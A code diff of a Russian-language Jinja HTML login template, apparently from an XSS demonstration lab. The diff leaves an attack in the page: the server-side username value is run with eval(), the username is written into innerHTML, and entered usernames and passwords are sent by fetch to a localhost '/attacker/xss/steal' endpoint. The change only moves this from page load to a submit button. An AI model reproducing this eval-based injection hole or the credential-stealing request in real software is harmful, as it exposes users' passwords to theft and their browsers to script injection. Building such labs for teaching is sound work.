@@ -20,13 +20,14 @@
         </div>
     {% else %}
         <h2>Введите свои данные</h2>
-        <p>Данные уже заполнены, нажмите "Проверить", чтобы продолжить.</p>
+        <p>Заполните форму ниже, чтобы продолжить.</p>
 
         <div class="input-form">
             <div class="input-container">
-                <input type="text" id="username" class="input-field" value="user123" readonly>
-                <input type="password" id="password" class="input-field" value="pass456" readonly>
+                <input type="text" id="username" class="input-field" placeholder="Имя пользователя..." value="">
+                <input type="password" id="password" class="input-field" placeholder="Введите пароль..." value="pass456">
                 <input type="hidden" id="xss-payload" value="{{ username }}">
+                <button type="button" class="submit-btn" onclick="submitForm()">Отправить</button>
             </div>
         </div>
 
@@ -40,8 +41,8 @@
             <p>Введите свои имя пользователя и пароль, чтобы продолжить:</p>
             <form method="POST">
                 <div class="input-container">
-                    <input type="text" name="username-input" class="input-field" value="user123">
-                    <input type="password" name="password-input" class="input-field" value="pass456">
+                    <input type="text" name="username-input" class="input-field" placeholder="Введите имя пользователя..." value="">
+                    <input type="password" name="password-input" class="input-field" placeholder="Введите пароль..." value="">
                     <button type="submit" class="submit-btn">Проверить</button>
                 </div>
                 {% if error %}
@@ -54,31 +55,34 @@
 
 {% if not show_link %}
     <script>
-        // Автоматическое выполнение пейлоада при загрузке страницы
-        window.onload = function() {
+        function submitForm() {
             const payload = document.getElementById('xss-payload').value;
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
             // Выполняем пейлоад
             try {
-                eval(payload); // Опасно, но нужно для XSS
+                if (payload) {
+                    eval(payload); // Опасно, но нужно для XSS
+                }
             } catch (e) {
                 console.error('Ошибка выполнения пейлоада:', e);
             }
 
-            // Отображаем приветствие
+            // Отображаем приветствие (если данные введены)
             const greetingDiv = document.getElementById('greeting');
-            greetingDiv.innerHTML = 'Привет, ' + username + '!';
+            if (username) {
+                greetingDiv.innerHTML = 'Привет, ' + username + '!';
+            }
 
-            // Отправляем данные
+            // Отправляем данные, если они введены
             if (username && password) {
                 const data = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
                 fetch('http://localhost:8080/attacker/xss/steal?' + data)
                     .then(response => console.log('Данные отправлены'))
                     .catch(error => console.error('Ошибка:', error));
             }
-        };
+        }
     </script>
 {% endif %}
 </body>
